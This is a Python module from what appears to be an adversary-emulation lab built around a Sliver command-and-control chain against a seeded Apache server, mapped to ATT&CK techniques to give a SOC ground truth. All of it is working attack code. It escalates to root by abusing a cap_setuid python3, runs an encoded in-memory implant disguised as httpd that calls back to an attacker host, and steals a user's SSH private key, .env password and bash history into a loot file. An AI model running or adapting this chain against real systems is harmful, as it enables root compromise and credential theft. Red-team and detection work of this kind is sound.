"""Advanced privesc + credential harvest on the apache webserver.

Two sub-phases in one chain step:

  A. Capability-based privesc (T1548.001 + T1620 + T1036.005)
     The lab seeds ``cap_setuid,cap_setgid+ep`` on ``/usr/bin/python3``
     (see Infrastructure/apache/Dockerfile; the in-fiction story is that
     Vinzenz set it so the booking CGI could chown user uploads, not
     realising file capabilities are per-binary). Via the www-data Sliver
     session, we invoke the capable python3 with a tiny prefix that calls
     ``os.setuid(0); os.setgid(0)`` and then execs the same Base64
     in-memory loader the initial exploit uses. The forked implant inherits
     uid=0 through normal Unix semantics and calls back to the Sliver
     listener as a new root session within ~3-5 seconds.

     Distinct from basic-mode privesc (which still uses the
     /opt/cleanup.sh cron tick, T1053.003) -- different ATT&CK technique,
     different SOC signal, no file write to FIM-watched paths, no 60s wait.

  B. Credential harvest as root (T1552.001 + T1552.004)
     Once the root session is live, the previously perm-denied files in
     ``/home/john.stravidis/`` are in scope. Pull them via Sliver
     ``download`` into the per-run results dir under
     ``<results_dir>/webserver-loot/`` and stage them in ``ctx.state`` for
     PR-C (apache -> john lateral via the stolen SSH key).

The T1505.003 web-shell persistence drop is delivered by a separate chain
step, :mod:`advanced_webserver_persistence`, so the SOC ground truth gives
that tactic its own narrow start/end window.
"""
# MITRE ATT&CK:
#   T1548.001 – Abuse Elevation Control: Setuid/Setgid (file capability)
#   T1068     – Exploitation for Privilege Escalation
#   T1620     – Reflective Code Loading                (in-memory root payload)
#   T1036.005 – Masquerading: Match Legitimate Name    (`[httpd]` argv[0], now root)
#   T1552.001 – Unsecured Credentials: Credentials In Files  (john's .env as root)
#   T1552.004 – Unsecured Credentials: Private Keys    (john's id_ed25519 as root)

import base64 as _b64
import json
import re
import time
from pathlib import Path

from chainlog import log
from advanced_initial_access import (
    build_payload,
    sliver_exec,
    _list_sliver,
    _SESSION_HEADER_RE,
)

# Polling: capability-based privesc is near-instant (~3 s for sliver to
# register the new root session); much shorter deadline than the cron variant.
CAP_POLL_INTERVAL_SECS = 2
CAP_POLL_MAX_SECS      = 20

# Files to harvest as root once the new root session is live. The
# .ssh/id_ed25519 is the primary credential consumed by PR-C lateral
# movement; .env is the fallback password; the rest are intelligence
# for the SOC ground-truth.
HARVEST_PATHS = [
    "/home/john.stravidis/.ssh/id_ed25519",
    "/home/john.stravidis/.ssh/config",
    "/home/john.stravidis/.env",
    "/home/john.stravidis/.bash_history",
    "/opt/waystar-connect/deploy.log",
]

# Loot file inside the run's results dir. PR-C reads this to bootstrap john_ws.
LOOT_FILENAME = "webserver-loot.json"


def _build_elevated_python_loader(kali_host: str, file_port: int = 8000) -> str:
    """Compose the Base64-encoded Python source that, when run by a
    cap_setuid-capable python3, elevates to root and invokes the standard
    in-memory implant loader.

    The body is the same Base64 payload used by initial access (from
    ``advanced_initial_access.build_payload``), prefixed with
    ``os.setuid(0); os.setgid(0)``. python3's file capability promotes the
    process to uid=0 *before* the memfd_create + fork + execve happens, so
    the spawned ``[httpd]``-masqueraded implant inherits root through
    normal Unix fork/exec semantics (no caps needed on the implant itself).

    Returns a Base64 string ready to pipe through ``base64 -d | python3``.
    """
    inner_b64 = build_payload(kali_host, file_port)
    elevated_src = (
        "import os\n"
        "os.setuid(0)\n"
        "os.setgid(0)\n"
        "import base64\n"
        f"exec(base64.b64decode('{inner_b64}'))\n"
    )
    return _b64.b64encode(elevated_src.encode()).decode()


def _parse_root_session_id(sliver_output: str, exclude: set[str]) -> str | None:
    """Find the first session whose Username column == 'root' and isn't in ``exclude``.

    Sliver's session table has a row per active session; we need the one that
    appeared *after* we invoked the capable python3, ergo not in the set we
    snapshotted just beforehand.
    """
    saw_header = False
    for line in sliver_output.splitlines():
        if _SESSION_HEADER_RE.search(line):
            saw_header = True
            continue
        if not saw_header:
            continue
        stripped = line.strip()
        if not stripped:
            return None
        if set(stripped) <= set("= "):
            continue
        parts = stripped.split()
        if len(parts) < 5:
            continue
        sess_id = parts[0]
        if sess_id in exclude:
            continue
        # Username is one of the middle columns; just scan for 'root' since
        # the table layout has changed across Sliver versions.
        if "root" in parts:
            return sess_id
    return None


def _capture_existing_session_ids() -> set[str]:
    """Snapshot the set of currently-active session IDs."""
    out = _list_sliver("sessions")
    ids: set[str] = set()
    saw_header = False
    for line in out.splitlines():
        if _SESSION_HEADER_RE.search(line):
            saw_header = True
            continue
        if not saw_header:
            continue
        stripped = line.strip()
        if not stripped:
            break
        if set(stripped) <= set("= "):
            continue
        ids.add(stripped.split()[0])
    return ids


def subphase_capability_privesc(sliver_session_id: str, cap_binary: str,
                                kali_host: str, scratch_dir: Path) -> str:
    """Sub-phase A: invoke the capable python3 to spawn a root Sliver session.

    Single-shot pipeline: ``echo <b64> | base64 -d | <cap_binary>``. The
    capable python3 honours the file's cap_setuid+ep on exec, so the
    embedded ``os.setuid(0)`` succeeds and the subsequent memfd_create +
    fork + execve produces a uid=0 implant. No file is written to disk
    on the target -- the loader source only ever lives in argv and the
    shell pipe buffer.
    """
    log("\n=== Sub-phase A: cap_setuid python3 -> root callback ===")
    log(f"[*] Using capable binary: {cap_binary} (expecting cap_setuid,cap_setgid+ep)")
    log(f"[*] Building elevated in-memory loader (callback: {kali_host}:8080)")

    elevated_b64 = _build_elevated_python_loader(kali_host)
    log(f"[+] Elevated loader: {len(elevated_b64)} base64 bytes")

    before = _capture_existing_session_ids()
    log(f"[*] Existing session(s) before invocation: {sorted(before)}")

    # sliver's `execute` parser eats ANY token starting with `-` after the
    # binary as if it were a sliver flag (silently!) -- so without `--` to
    # separate sliver flags from target argv, the `-c "..."` and the
    # setsid `-f` get dropped and /bin/sh runs with zero args. The `--`
    # is mandatory. setsid -f then forks into a new session, severing
    # the process group so the python3 (and its fork'd memfd implant)
    # survive sliver's exec-complete cleanup.
    cmd = (
        f"execute -o -- setsid -f /bin/sh -c "
        f"\"echo {elevated_b64} | base64 -d | {cap_binary} >/dev/null 2>&1\""
    )
    log(f"[*] sliver: {cmd[:90]}...")
    sliver_exec(sliver_session_id, cmd)

    log(f"[*] Polling for the new root session (expected <{CAP_POLL_MAX_SECS}s)...")
    deadline = time.time() + CAP_POLL_MAX_SECS
    while time.time() < deadline:
        time.sleep(CAP_POLL_INTERVAL_SECS)
        out = _list_sliver("sessions")
        root_id = _parse_root_session_id(out, exclude=before)
        if root_id:
            log(f"[+] New root session captured: {root_id}")
            return root_id
        log("[*] still waiting for root session...")
    raise RuntimeError(
        "advanced_webserver_privesc: capable python3 produced no root session "
        f"within {CAP_POLL_MAX_SECS} s; verify cap_setuid+ep on {cap_binary} "
        f"with `getcap {cap_binary}` from a manual sliver session"
    )


def subphase_harvest_creds(root_session_id: str, scratch_dir: Path) -> dict:
    """Sub-phase B: as root via the new session, pull John's creds + intel files."""
    log("\n=== Sub-phase B: credential harvest as root ===")
    loot_dir = scratch_dir / "downloads"
    loot_dir.mkdir(parents=True, exist_ok=True)

    files: dict[str, str | None] = {}
    for remote_path in HARVEST_PATHS:
        local_name = Path(remote_path).name
        local_target = loot_dir / local_name
        log(f"[*] sliver: download {remote_path} -> {local_target}")
        sliver_exec(
            root_session_id,
            f"download {remote_path} {local_target}",
            timeout=20,
        )
        if local_target.is_file():
            try:
                files[remote_path] = local_target.read_text(
                    encoding="utf-8", errors="replace"
                )
                log(f"[+] harvested {remote_path}  ({local_target.stat().st_size} bytes)")
            except Exception as e:
                log(f"[-] could not read local {local_target}: {e}")
                files[remote_path] = None
        else:
            log(f"[-] download produced no local file at {local_target}")
            files[remote_path] = None

    # Extract the WS_PASS=value from the .env if it landed.
    env_blob = files.get("/home/john.stravidis/.env") or ""
    m = re.search(r"^WS_PASS=(.+)$", env_blob, re.MULTILINE)
    john_password = m.group(1).strip().strip('"').strip("'") if m else None

    return {
        "john_ssh_key":     files.get("/home/john.stravidis/.ssh/id_ed25519"),
        "john_ssh_config":  files.get("/home/john.stravidis/.ssh/config"),
        "john_env":         env_blob or None,
        "john_password":    john_password,
        "john_bash_history": files.get("/home/john.stravidis/.bash_history"),
        "deploy_log":       files.get("/opt/waystar-connect/deploy.log"),
        "john_username":    "john.stravidis",
    }


def run(sliver_session_id: str, cap_binary: str,
        kali_host: str = "10.10.0.2",
        results_dir: str = "/Attack-chain/results") -> dict:
    """Run the privesc + credential-harvest step.

    Args:
        sliver_session_id: ID of the www-data session implant (from PR-B exploit).
        cap_binary:        Path to a binary with cap_setuid+ep, discovered by
                           the enum step (e.g. /usr/bin/python3 per the lab seed).
        kali_host:         IP the new root loader calls back to.
        results_dir:       Per-run dir to write ``webserver-loot.json`` into.

    Returns: dict for ``ctx.state`` with ``root_sliver_session`` +
             ``john_ssh_key`` + ``john_password`` + intel files. Also writes
             ``<results_dir>/webserver-loot.json`` for downstream consumption.
    """
    scratch_dir = Path(results_dir) / "webserver-loot"
    scratch_dir.mkdir(parents=True, exist_ok=True)

    log(f"\n[*] Starting advanced webserver privesc -> root via {cap_binary}")
    root_id = subphase_capability_privesc(
        sliver_session_id, cap_binary, kali_host, scratch_dir,
    )

    loot = subphase_harvest_creds(root_id, scratch_dir)
    loot["root_sliver_session"] = root_id

    # Persist the loot for the SOC ground truth + the next PR.
    loot_json_path = scratch_dir / LOOT_FILENAME
    loot_json_path.write_text(
        json.dumps(loot, indent=2, ensure_ascii=False), encoding="utf-8"
    )
    log(f"[+] Wrote loot bundle: {loot_json_path}")

    log("\n" + "=" * 60)
    log("[*] Webserver privesc + harvest complete:")
    log(f"    root_sliver_session : {root_id}")
    log(f"    john_ssh_key bytes  : {len(loot.get('john_ssh_key') or '')}")
    log(f"    john_password       : {loot.get('john_password')}")
    log(f"    deploy_log bytes    : {len(loot.get('deploy_log') or '')}")
    log("=" * 60)

    return loot
